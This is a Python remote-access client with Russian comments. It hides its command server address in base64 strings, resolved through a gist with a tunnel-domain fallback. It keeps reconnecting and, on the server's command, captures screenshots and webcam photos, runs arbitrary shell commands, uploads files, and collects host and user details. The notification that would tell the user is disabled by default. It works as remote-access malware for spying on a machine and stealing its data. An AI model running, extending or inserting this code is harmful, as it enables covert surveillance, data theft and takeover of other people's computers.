from __future__ import annotations

import asyncio
import base64
import getpass
import json
import logging
import os
from pathlib import Path
import platform
import random
import shutil
import socket
import stat
import subprocess
import sys
import tempfile
from typing import Any, Callable, Coroutine, Dict, Optional, Tuple

import cv2
import mss
import mss.tools
import psutil
import pygame
import websockets
from websockets.asyncio.client import ClientConnection


if not hasattr(asyncio, "to_thread"):
    import contextvars
    import functools

    async def _to_thread(func, *args, **kwargs):
        loop = asyncio.get_running_loop()
        ctx = contextvars.copy_context()
        func_call = functools.partial(ctx.run, func, *args, **kwargs)
        return await loop.run_in_executor(None, func_call)

    asyncio.to_thread = _to_thread


logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    stream=sys.stdout,
)
logger = logging.getLogger("client")


_RESOLVER_B64 = b"aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXcvNWVkM2RmMTE4MTcxZWM5YmMwY2U4ZDM3YmMwZGNkMjgvc2VydmVyX3VybC50eHQ="
_FALLBACK_B64 = b"d3NzOi8vYW5hbHlzdHMtbW90aGVycy1wb3dlci1jaHJvbmljbGUudHJ5Y2xvdWRmbGFyZS5jb20="

SERVER_URL = os.environ.get("SERVER_URL", "auto")
CLIENT_ID = f"{getpass.getuser()}@{socket.gethostname()}"


def resolve_server_url() -> str:
    """Определяет актуальный адрес сервера (динамически или резервный)."""
    env_url = os.environ.get("SERVER_URL")
    if env_url and env_url != "auto" and not env_url.startswith("auto:"):
        return env_url

    try:
        import urllib.request
        endpoint = base64.b64decode(_RESOLVER_B64).decode("ascii")
        req = urllib.request.Request(endpoint, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            content = resp.read().decode("utf-8").strip()
            if content.startswith("ws://") or content.startswith("wss://"):
                logger.info("Dynamic server URL resolved: %s", content)
                return content
    except Exception as exc:
        logger.warning("Failed to fetch dynamic server URL: %s", exc)

    return base64.b64decode(_FALLBACK_B64).decode("ascii")


AUTH_TOKEN = os.environ.get(
    "REMOTE_AUTH_TOKEN",
    os.environ.get("AUTH_TOKEN", "default-insecure-token-change-me"),
)


INITIAL_RECONNECT_DELAY = 1.0
MAX_RECONNECT_DELAY = 60.0
BACKOFF_FACTOR = 2.0


MAX_FILE_SIZE = 50 * 1024 * 1024
ALLOWED_BASE_DIR: Optional[str] = os.environ.get("ALLOWED_BASE_DIR")


CURRENT_DIR: str = os.path.expanduser("~")


def take_screenshot_bytes() -> bytes:
    with mss.mss() as sct:
        mon = sct.monitors[1]
        shot = sct.grab(mon)
        return mss.tools.to_png(shot.rgb, shot.size)


def take_webcam_photo() -> bytes:
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        raise RuntimeError("Cannot open default webcam")

    try:

        for _ in range(8):
            cap.read()

        ok, frame = cap.read()
        if not ok or frame is None:
            raise RuntimeError("Failed to capture webcam frame")

        ok, encoded = cv2.imencode(".png", frame)
        if not ok:
            raise RuntimeError("Failed to encode webcam frame to PNG")
        return encoded.tobytes()
    finally:
        cap.release()


def collect_system_info() -> dict:
    vm = psutil.virtual_memory()
    proc = platform.processor()
    user_str = None
    try:
        user_str = getpass.getuser()
    except Exception:
        pass
    return {
        "os": platform.system(),
        "os_release": platform.release(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "processor": proc if proc else "unknown",
        "ram_total_bytes": vm.total,
        "hostname": platform.node(),
        "user": user_str,
    }


def set_system_volume(level: int) -> None:
    """Устанавливает системную громкость (0–100%)."""
    level = max(0, min(100, int(level)))
    system = platform.system()

    if system == "Windows":
        from ctypes import POINTER, cast
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

        speakers = AudioUtilities.GetSpeakers()
        dev = getattr(speakers, "_dev", speakers)
        interface = dev.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level / 100.0, None)
        return

    if system == "Linux":
        pct = f"{level}%"


        if shutil.which("pactl"):
            try:
                r = subprocess.run(
                    ["pactl", "set-sink-volume", "@DEFAULT_SINK@", pct],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                if r.returncode == 0:
                    if level > 0:
                        subprocess.run(["pactl", "set-sink-mute", "@DEFAULT_SINK@", "0"], capture_output=True, timeout=2)
                    return
            except Exception:
                pass


        if shutil.which("wpctl"):
            try:
                vol_float = f"{level / 100.0:.2f}"
                r = subprocess.run(
                    ["wpctl", "set-volume", "@DEFAULT_AUDIO_SINK@", vol_float],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                if r.returncode == 0:
                    if level > 0:
                        subprocess.run(["wpctl", "set-mute", "@DEFAULT_AUDIO_SINK@", "0"], capture_output=True, timeout=2)
                    return
            except Exception:
                pass


        if shutil.which("amixer"):
            try:
                cmd = ["amixer", "-D", "pulse", "sset", "Master", pct]
                if level > 0:
                    cmd.append("unmute")
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                if r.returncode == 0:
                    return
            except Exception:
                pass


            try:
                r_get = subprocess.run(["amixer", "get", "Master"], capture_output=True, text=True, timeout=5)
                if r_get.returncode == 0:
                    import re
                    m = re.search(r"Limits:\s*Playback\s*(\d+)\s*-\s*(\d+)", r_get.stdout)
                    if m:
                        min_step = int(m.group(1))
                        max_step = int(m.group(2))
                        raw_step = round(min_step + (level / 100.0) * (max_step - min_step))
                        step_cmd = ["amixer", "set", "Master", str(raw_step)]
                        if level > 0:
                            step_cmd.append("unmute")
                        sub_r = subprocess.run(step_cmd, capture_output=True, text=True, timeout=5)
                        if sub_r.returncode == 0:
                            return
            except Exception as alsa_err:
                logger.debug("Discrete ALSA step volume calculation failed: %s", alsa_err)


            try:
                sub_r = subprocess.run(
                    ["amixer", "-M", "set", "Master", pct, "unmute" if level > 0 else "mute"],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                if sub_r.returncode == 0:
                    return
            except Exception:
                pass


            for cmd in [
                ["amixer", "set", "Master", pct, "unmute" if level > 0 else "mute"],
                ["amixer", "sset", "Master", pct, "unmute" if level > 0 else "mute"],
            ]:
                try:
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                    if r.returncode == 0:
                        return
                except Exception:
                    pass

        raise RuntimeError("Не удалось изменить громкость (ни pactl, ни amixer, ни wpctl не сработали)")

    raise RuntimeError(f"Unsupported OS for volume control: {system}")


def play_audio_file(filepath: str) -> None:
    if not os.path.exists(filepath):
        raise FileNotFoundError(f"Audio file does not exist: {filepath}")

    system = platform.system()
    if system == "Linux" and shutil.which("amixer"):
        try:
            subprocess.run(["amixer", "set", "Master", "unmute"], capture_output=True, timeout=2)
        except Exception:
            pass

    played = False
    try:

        try:
            pygame.mixer.init()
            try:
                pygame.mixer.music.load(filepath)
                pygame.mixer.music.play()
                while pygame.mixer.music.get_busy():
                    pygame.time.Clock().tick(10)
                played = True
            finally:
                try:
                    pygame.mixer.quit()
                except Exception:
                    pass
        except Exception as py_err:
            logger.warning("pygame.mixer playback failed (%s), trying system players...", py_err)

        if played:
            return


        if system == "Linux":
            if shutil.which("ffplay"):
                r = subprocess.run(["ffplay", "-nodisp", "-autoexit", "-loglevel", "quiet", filepath], timeout=60)
                if r.returncode == 0:
                    return
            if shutil.which("mpv"):
                r = subprocess.run(["mpv", "--no-video", "--really-quiet", filepath], timeout=60)
                if r.returncode == 0:
                    return
            if shutil.which("aplay") and filepath.lower().endswith(".wav"):
                r = subprocess.run(["aplay", "-q", filepath], timeout=60)
                if r.returncode == 0:
                    return
            if shutil.which("cvlc"):
                r = subprocess.run(["cvlc", "--play-and-exit", "-q", filepath], timeout=60)
                if r.returncode == 0:
                    return

        if not played:
            raise RuntimeError("Не удалось воспроизвести аудио ни через pygame, ни через системные плееры.")
    finally:

        if "remote_audio_" in filepath:
            try:
                os.remove(filepath)
            except Exception:
                pass


def minimize_all_windows() -> None:
    """Сворачивает все окна (Windows / Linux: wmctrl, KDE KWin qdbus, xdotool, X11)."""
    system = platform.system()

    if system == "Windows":
        import win32com.client
        shell = win32com.client.Dispatch("Shell.Application")
        shell.MinimizeAll()
        return

    if system == "Linux":

        if shutil.which("wmctrl"):
            try:
                r = subprocess.run(["wmctrl", "-k", "on"], capture_output=True, text=True, timeout=5)
                if r.returncode == 0:
                    return
            except Exception:
                pass


        if shutil.which("qdbus"):
            for qcmd in [
                ["qdbus", "org.kde.kglobalaccel", "/component/kwin", "invokeShortcut", "Show Desktop"],
                ["qdbus", "org.kde.KWin", "/KWin", "showDesktop", "true"],
            ]:
                try:
                    r = subprocess.run(qcmd, capture_output=True, text=True, timeout=5)
                    if r.returncode == 0:
                        return
                except Exception:
                    pass


        if shutil.which("xdotool"):
            for shortcut in [["xdotool", "key", "super+d"], ["xdotool", "key", "ctrl+alt+d"]]:
                try:
                    r = subprocess.run(shortcut, capture_output=True, text=True, timeout=5)
                    if r.returncode == 0:
                        return
                except Exception:
                    pass


        try:
            import ctypes
            x11 = ctypes.cdll.LoadLibrary("libX11.so.6")
            d = x11.XOpenDisplay(None)
            if d:
                r = x11.XDefaultRootWindow(d)
                a = x11.XInternAtom(d, b"_NET_SHOWING_DESKTOP", False)
                class E(ctypes.Structure):
                    _fields_ = [
                        ("t", ctypes.c_int), ("s", ctypes.c_ulong), ("se", ctypes.c_int),
                        ("d", ctypes.c_void_p), ("w", ctypes.c_ulong), ("m", ctypes.c_ulong),
                        ("f", ctypes.c_int), ("data", ctypes.c_long * 5)
                    ]
                class U(ctypes.Union):
                    _fields_ = [("t", ctypes.c_int), ("x", E), ("p", ctypes.c_long * 24)]
                e = U()
                e.t = 33
                e.x.t = 33
                e.x.d = d
                e.x.w = r
                e.x.m = a
                e.x.f = 32
                e.x.data[0] = 1
                mask = (1 << 20) | (1 << 19)
                x11.XSendEvent(d, r, False, ctypes.c_long(mask), ctypes.byref(e))
                x11.XFlush(d)
                x11.XCloseDisplay(d)
                return
        except Exception as x11_err:
            logger.debug("X11 direct minimize failed: %s", x11_err)

        raise RuntimeError("Утилита для сворачивания окон не найдена (установите wmctrl или qdbus/xdotool)")

    raise RuntimeError(f"Unsupported OS for minimize_all: {system}")


def close_all_windows() -> None:
    """Закрывает все пользовательские окна."""
    system = platform.system()

    if system == "Windows":
        ps_script = (
            "(New-Object -ComObject Shell.Application).Windows() | "
            "ForEach-Object { $_.Quit() }"
        )
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_script],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if r.returncode != 0:
            err = (r.stderr or r.stdout or "").strip()
            raise RuntimeError(f"PowerShell close_all failed: {err or 'unknown error'}")
        return

    if system == "Linux":
        if shutil.which("wmctrl"):
            r = subprocess.run(
                ["wmctrl", "-l"],
                capture_output=True,
                text=True,
                timeout=15,
            )
            if r.returncode == 0:
                errors: list[str] = []
                for line in r.stdout.splitlines():
                    parts = line.split(None, 3)
                    if not parts:
                        continue
                    wid = parts[0]
                    rc = subprocess.run(
                        ["wmctrl", "-ic", wid],
                        capture_output=True,
                        text=True,
                        timeout=10,
                    )
                    if rc.returncode != 0:
                        errors.append(f"{wid}: {(rc.stderr or rc.stdout or '').strip()}")

                if errors:
                    raise RuntimeError("Some windows could not be closed: " + "; ".join(errors))
                return

        if shutil.which("xdotool"):
            r = subprocess.run(["xdotool", "search", "--onlyvisible", "--class", "."], capture_output=True, text=True, timeout=5)
            if r.returncode == 0:
                for wid in r.stdout.splitlines():
                    if wid.strip():
                        subprocess.run(["xdotool", "windowclose", wid.strip()], capture_output=True, timeout=2)
                return

        raise RuntimeError("Утилита для закрытия окон не найдена (требуется wmctrl или xdotool)")

    raise RuntimeError(f"Unsupported OS for close_all: {system}")


def list_audio_files() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    exts = {".mp3", ".wav", ".ogg"}
    files: list[str] = []
    for name in os.listdir(script_dir):
        full_path = os.path.join(script_dir, name)
        if not os.path.isfile(full_path):
            continue
        _, ext = os.path.splitext(name)
        if ext.lower() in exts:
            files.append(name)
    files.sort(key=str.lower)
    return files


def show_desktop_notification(title: str, message: str) -> None:
    """
    Показывает всплывающее системное уведомление на рабочем столе клиента.
    - Linux: notify-send (libnotify)
    - Windows: PowerShell Toast Notification
    """
    system = platform.system()
    try:
        if system == "Linux":
            env = os.environ.copy()
            if "DISPLAY" not in env:
                env["DISPLAY"] = ":0"
            subprocess.run(
                ["notify-send", "-a", "Remote Access", "-i", "network-idle", title, message],
                env=env,
                capture_output=True,
                timeout=5,
            )
        elif system == "Windows":
            safe_title = title.replace("'", "''")
            safe_msg = message.replace("'", "''")
            ps_script = (
                "[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null; "
                "$template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02); "
                "$textNodes = $template.GetElementsByTagName('text'); "
                f"$textNodes.Item(0).AppendChild($template.CreateTextNode('{safe_title}')) > $null; "
                f"$textNodes.Item(1).AppendChild($template.CreateTextNode('{safe_msg}')) > $null; "
                "$toast = [Windows.UI.Notifications.ToastNotification]::new($template); "
                "[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('RemoteAccess').Show($toast)"
            )
            subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_script],
                capture_output=True,
                timeout=5,
            )
    except Exception as exc:
        logger.debug("Failed to show desktop notification: %s", exc)


def validate_and_resolve_file_path(
    path_str: str,
    current_dir: str,
    allowed_base_dir: Optional[str] = None,
) -> Tuple[Optional[Path], Optional[str]]:
    """
    Проверяет путь на Path Traversal, запрещённые системные файлы и спец-устройства.
    Возвращает (канонический Path, None) либо (None, описание ошибки).
    """
    if not path_str or not path_str.strip():
        return None, "Путь к файлу не указан"

    clean_str = path_str.strip().strip("\"'")
    if "\0" in clean_str:
        return None, "Недопустимый путь: обнаружен нулевой байт"

    path_obj = Path(clean_str).expanduser()
    if not path_obj.is_absolute():
        path_obj = Path(current_dir) / path_obj

    try:
        resolved = path_obj.resolve(strict=True)
    except FileNotFoundError:
        return None, f"Файл не найден: {path_obj}"
    except PermissionError:
        return None, f"Отказано в доступе к пути: {path_obj}"
    except Exception as exc:
        return None, f"Ошибка разрешения пути: {exc}"


    if allowed_base_dir:
        try:
            base = Path(allowed_base_dir).resolve()
            resolved.relative_to(base)
        except ValueError:
            return None, f"Доступ запрещен: путь вне разрешенной директории ({allowed_base_dir})"


    posix_path = resolved.as_posix()
    BLOCKED_DEVICE_PREFIXES = ("/dev/", "/proc/", "/sys/")
    BLOCKED_SYSTEM_PREFIXES = ("/etc/sudoers.d/",)
    BLOCKED_FILES = {
        "/etc/shadow",
        "/etc/shadow-",
        "/etc/gshadow",
        "/etc/gshadow-",
        "/etc/sudoers",
        "/etc/master.passwd",
    }
    if any(posix_path == pref[:-1] or posix_path.startswith(pref) for pref in BLOCKED_DEVICE_PREFIXES):
        return None, "Доступ запрещен: обращение к виртуальным или сервисным устройствам ОС"
    if any(posix_path.startswith(pref) for pref in BLOCKED_SYSTEM_PREFIXES) or posix_path in BLOCKED_FILES:
        return None, "Доступ запрещен: критический системный файл"

    try:
        st = resolved.stat()
    except Exception as exc:
        return None, f"Не удалось получить атрибуты файла: {exc}"

    if not stat.S_ISREG(st.st_mode):
        return None, f"Указанный путь не является обычным файлом (mode: {oct(st.st_mode)})"

    return resolved, None


def safe_read_file(file_path: Path, max_bytes: int = MAX_FILE_SIZE) -> bytes:
    """Потоковое чтение файла порциями с жёстким контролем лимита памяти."""
    chunks: list[bytes] = []
    total = 0
    with open(file_path, "rb") as f:
        while True:
            chunk = f.read(64 * 1024)
            if not chunk:
                break
            total += len(chunk)
            if total > max_bytes:
                raise ValueError(
                    f"Размер файла превышает лимит {max_bytes / (1024 * 1024):.1f} МБ"
                )
            chunks.append(chunk)
    return b"".join(chunks)


async def execute_shell_command(cmd_str: str) -> str:
    """Выполняет shell-команду на Linux."""
    global CURRENT_DIR

    if platform.system() != "Linux":
        return "Shell commands are only supported on Linux"

    stripped = cmd_str.strip()
    if stripped == "cd" or stripped.startswith("cd ") or stripped.startswith("cd\t"):
        path_arg = stripped[2:].strip() or os.path.expanduser("~")
        if path_arg == "-":
            return "cd: '-' not supported in stateless shell"
        new_dir = os.path.abspath(os.path.join(CURRENT_DIR, path_arg))
        if not os.path.isdir(new_dir):
            return f"cd: {new_dir}: No such file or directory"
        CURRENT_DIR = new_dir
        return f"(changed directory to {CURRENT_DIR})"

    try:
        proc = await asyncio.create_subprocess_shell(
            stripped,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=CURRENT_DIR,
        )
        try:
            stdout_b, stderr_b = await asyncio.wait_for(proc.communicate(), timeout=30)
        except asyncio.TimeoutError:
            proc.kill()
            return "[ERROR] Command timed out after 30 seconds"

        stdout = stdout_b.decode(errors="replace")
        stderr = stderr_b.decode(errors="replace")
        output = stdout
        if stderr:
            output += stderr if not stdout else f"\n[stderr]\n{stderr}"
        return output if output else f"(exit code {proc.returncode}, no output)"
    except Exception as exc:
        return f"[ERROR] Failed to execute command: {exc}"


class CommandDispatcher:
    """Реестр обработчиков команд сервера."""

    def __init__(self) -> None:
        self._handlers: Dict[
            str,
            Callable[[ClientConnection, dict], Coroutine[Any, Any, None]],
        ] = {}

    def register(self, action: str):
        def decorator(
            func: Callable[[ClientConnection, dict], Coroutine[Any, Any, None]]
        ):
            self._handlers[action] = func
            return func

        return decorator

    async def dispatch(self, ws: ClientConnection, command: dict) -> None:
        action = command.get("action")
        if not action or not isinstance(action, str):
            logger.warning("Received command without valid action: %r", command)
            return

        handler = self._handlers.get(action)
        if not handler:
            logger.info("Unknown action requested: %s", action)
            return

        try:
            await handler(ws, command)
        except Exception as exc:
            logger.error(
                "Error executing handler for action '%s': %s",
                action,
                exc,
                exc_info=True,
            )
            try:
                await ws.send(
                    json.dumps({
                        "type": "info",
                        "client_id": CLIENT_ID,
                        "message": f"Handler error for '{action}': {exc}",
                    })
                )
            except Exception:
                pass


dispatcher = CommandDispatcher()


@dispatcher.register("screenshot")
async def cmd_screenshot(ws: ClientConnection, command: dict) -> None:
    logger.info("Screenshot command received")
    try:
        raw = await asyncio.to_thread(take_screenshot_bytes)
        b64 = base64.b64encode(raw).decode("ascii")
        await ws.send(
            json.dumps({
                "type": "screenshot_result",
                "client_id": CLIENT_ID,
                "data": b64,
            })
        )
        logger.info("Screenshot sent (%d bytes, base64)", len(raw))
    except Exception as exc:
        logger.error("Failed to capture/send screenshot: %s", exc)


@dispatcher.register("webcam")
async def cmd_webcam(ws: ClientConnection, command: dict) -> None:
    logger.info("Webcam command received")
    try:
        raw = await asyncio.to_thread(take_webcam_photo)
        b64 = base64.b64encode(raw).decode("ascii")
        await ws.send(
            json.dumps({
                "type": "webcam_result",
                "client_id": CLIENT_ID,
                "data": b64,
            })
        )
        logger.info("Webcam photo sent (%d bytes, base64)", len(raw))
    except Exception as exc:
        logger.error("Failed to capture/send webcam photo: %s", exc)


@dispatcher.register("sys_info")
async def cmd_sys_info(ws: ClientConnection, command: dict) -> None:
    logger.info("System info command received")
    try:
        info = await asyncio.to_thread(collect_system_info)
        payload = {
            "type": "sys_info",
            "client_id": CLIENT_ID,
            "auth_token": AUTH_TOKEN,
            **info,
        }
        await ws.send(json.dumps(payload))
        logger.info("System info sent")
    except Exception as exc:
        logger.error("Failed to collect/send system info: %s", exc)


@dispatcher.register("set_volume")
async def cmd_set_volume(ws: ClientConnection, command: dict) -> None:
    logger.info("Set volume command received")
    raw_level = command.get("level")
    try:
        lvl = int(raw_level)
    except (TypeError, ValueError):
        msg = f"Invalid volume level: {raw_level!r}"
        logger.warning(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )
        return

    try:
        await asyncio.to_thread(set_system_volume, lvl)
        msg = f"Volume set to {max(0, min(100, lvl))}%"
        logger.info(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )
    except Exception as exc:
        msg = f"Failed to set volume: {exc}"
        logger.error(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )


@dispatcher.register("play_audio")
async def cmd_play_audio(ws: ClientConnection, command: dict) -> None:
    logger.info("Play audio command received")
    filename = command.get("filename", "audio.mp3")
    b64_data = command.get("data")
    filepath = command.get("file_path")


    if b64_data:
        try:
            audio_bytes = base64.b64decode(b64_data)
            suffix = Path(filename).suffix or ".mp3"
            fd, temp_path = tempfile.mkstemp(prefix="remote_audio_", suffix=suffix)
            with os.fdopen(fd, "wb") as f:
                f.write(audio_bytes)
            filepath = temp_path
            logger.info("Decoded %d audio bytes from server into %s", len(audio_bytes), filepath)
        except Exception as dec_err:
            msg = f"Failed to decode server audio data: {dec_err}"
            logger.error(msg)
            await ws.send(json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg}))
            return

    if not filepath or not isinstance(filepath, str) or not filepath.strip():
        msg = "Missing or invalid file_path / audio data for play_audio"
        logger.warning(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )
        return

    filepath = filepath.strip()

    async def _send_play_error(exc: Exception) -> None:
        msg_inner = f"Failed to play audio: {exc}"
        logger.error(msg_inner)
        try:
            await ws.send(
                json.dumps({
                    "type": "info",
                    "client_id": CLIENT_ID,
                    "message": msg_inner,
                })
            )
        except Exception as send_exc:
            logger.error("Failed to send play_audio error info: %s", send_exc)

    try:
        task = asyncio.create_task(asyncio.to_thread(play_audio_file, filepath))

        def _on_play_done(done_task: asyncio.Task) -> None:
            try:
                done_task.result()
            except Exception as exc:
                asyncio.create_task(_send_play_error(exc))

        task.add_done_callback(_on_play_done)
        msg = f"Audio playback started: {filename if b64_data else filepath}"
        logger.info(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )
    except Exception as exc:
        msg = f"Failed to start audio playback: {exc}"
        logger.error(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )


@dispatcher.register("minimize_all")
async def cmd_minimize_all(ws: ClientConnection, command: dict) -> None:
    logger.info("Minimize All command received")
    try:
        await asyncio.to_thread(minimize_all_windows)
        msg = "All windows minimized"
        logger.info(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )
    except Exception as exc:
        msg = f"Failed to minimize all windows: {exc}"
        logger.error(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )


@dispatcher.register("close_all")
async def cmd_close_all(ws: ClientConnection, command: dict) -> None:
    logger.info("Close All command received")
    try:
        await asyncio.to_thread(close_all_windows)
        msg = "All windows closed"
        logger.info(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )
    except Exception as exc:
        msg = f"Failed to close all windows: {exc}"
        logger.error(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )


@dispatcher.register("list_audio")
async def cmd_list_audio(ws: ClientConnection, command: dict) -> None:
    logger.info("List audio command received")
    try:
        files = await asyncio.to_thread(list_audio_files)
        await ws.send(
            json.dumps({
                "type": "audio_list",
                "client_id": CLIENT_ID,
                "files": files,
            })
        )
        logger.info("Sent audio file list (%d files)", len(files))
    except Exception as exc:
        msg = f"Failed to list audio files: {exc}"
        logger.error(msg)
        await ws.send(
            json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
        )


async def handle_copy_file(ws: ClientConnection, filepath_arg: str) -> None:
    """Обработчик команды скачивания файла с валидацией пути и безопасным чтением."""
    resolved_path, err = validate_and_resolve_file_path(
        filepath_arg, CURRENT_DIR, ALLOWED_BASE_DIR
    )
    if err or not resolved_path:
        err_msg = f"[ERROR] {err}"
        logger.warning("File copy rejected: %s", err_msg)
        await ws.send(
            json.dumps({
                "type": "shell_result",
                "client_id": CLIENT_ID,
                "output": err_msg,
            })
        )
        return

    try:
        file_size = resolved_path.stat().st_size
        if file_size > MAX_FILE_SIZE:
            err_msg = (
                f"[ERROR] File too large: {file_size / (1024 * 1024):.1f} MB "
                f"(Telegram limit is {MAX_FILE_SIZE / (1024 * 1024):.0f} MB)"
            )
            logger.warning(err_msg)
            await ws.send(
                json.dumps({
                    "type": "shell_result",
                    "client_id": CLIENT_ID,
                    "output": err_msg,
                })
            )
            return

        raw_bytes = await asyncio.to_thread(
            safe_read_file, resolved_path, MAX_FILE_SIZE
        )
        b64_data = base64.b64encode(raw_bytes).decode("ascii")
        await ws.send(
            json.dumps({
                "type": "file_result",
                "client_id": CLIENT_ID,
                "filename": resolved_path.name,
                "data": b64_data,
            })
        )
        logger.info(
            "File successfully sent: %s (%d bytes)", resolved_path, len(raw_bytes)
        )
    except Exception as exc:
        err_msg = f"[ERROR] Failed to read/send file: {exc}"
        logger.error(err_msg)
        await ws.send(
            json.dumps({
                "type": "shell_result",
                "client_id": CLIENT_ID,
                "output": err_msg,
            })
        )


@dispatcher.register("shell")
async def cmd_shell(ws: ClientConnection, command: dict) -> None:
    cmd_str = command.get("command", command.get("cmd", ""))
    logger.info("Shell command received: %r", cmd_str)

    if not isinstance(cmd_str, str) or not cmd_str.strip():
        msg = "Empty or invalid shell command"
        await ws.send(
            json.dumps({
                "type": "shell_result",
                "client_id": CLIENT_ID,
                "output": msg,
            })
        )
        return

    stripped_cmd = cmd_str.strip()
    if stripped_cmd.startswith("copy ") or stripped_cmd.startswith("copy\t"):
        filepath_arg = stripped_cmd[5:].strip()
        await handle_copy_file(ws, filepath_arg)
    elif stripped_cmd == "copy":
        err_msg = "[ERROR] Использование: copy <путь_к_файлу>"
        await ws.send(
            json.dumps({
                "type": "shell_result",
                "client_id": CLIENT_ID,
                "output": err_msg,
            })
        )
    else:
        try:
            output = await execute_shell_command(cmd_str)
            await ws.send(
                json.dumps({
                    "type": "shell_result",
                    "client_id": CLIENT_ID,
                    "output": output,
                })
            )
            logger.info("Shell result sent (%d chars)", len(output))
        except Exception as exc:
            msg = f"[ERROR] {exc}"
            await ws.send(
                json.dumps({
                    "type": "shell_result",
                    "client_id": CLIENT_ID,
                    "output": msg,
                })
            )


async def handle_server_commands(ws: ClientConnection) -> None:
    logger.info("Ready. Waiting for commands as client_id=%s", CLIENT_ID)
    async for message in ws:
        if isinstance(message, bytes):
            logger.warning("Received unexpected binary command, ignoring")
            continue

        try:
            command = json.loads(message)
        except json.JSONDecodeError:
            logger.warning("Invalid JSON command received, ignoring")
            continue

        if not isinstance(command, dict):
            logger.warning("Command payload is not a dict: %r", command)
            continue

        await dispatcher.dispatch(ws, command)


async def run_client() -> None:
    current_delay = INITIAL_RECONNECT_DELAY

    while True:
        try:
            target_url = await asyncio.to_thread(resolve_server_url)
            logger.info("Connecting to %s ...", target_url)
            async with websockets.connect(target_url, max_size=None) as ws:
                logger.info("Connected to server. Sending auth handshake...")
                info = await asyncio.to_thread(collect_system_info)
                hello_payload = {
                    "type": "sys_info",
                    "client_id": CLIENT_ID,
                    "auth_token": AUTH_TOKEN,
                    **info,
                }
                await ws.send(json.dumps(hello_payload))
                logger.info("Initial sys_info with auth token sent successfully")


                current_delay = INITIAL_RECONNECT_DELAY


                if os.environ.get("ENABLE_NOTIFICATION") == "1":
                    asyncio.create_task(
                        asyncio.to_thread(
                            show_desktop_notification,
                            "Remote Access",
                            f"Клиент успешно подключен к серверу!\nID: {CLIENT_ID}",
                        )
                    )

                await handle_server_commands(ws)

        except (ConnectionRefusedError, websockets.ConnectionClosed, OSError) as exc:
            logger.warning("Connection lost/failed: %s", exc)
        except asyncio.CancelledError:
            logger.info("Client execution cancelled.")
            raise
        except Exception as exc:
            logger.error("Unexpected client error: %s", exc, exc_info=True)


        sleep_duration = (
            random.uniform(0.5, current_delay)
            if current_delay > 0.5
            else current_delay
        )
        logger.info(
            "Reconnecting in %.2fs (backoff ceiling: %.2fs)...",
            sleep_duration,
            current_delay,
        )
        current_delay = min(MAX_RECONNECT_DELAY, current_delay * BACKOFF_FACTOR)

        await asyncio.sleep(sleep_duration)


if __name__ == "__main__":
    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        logger.info("Client stopped by user.")
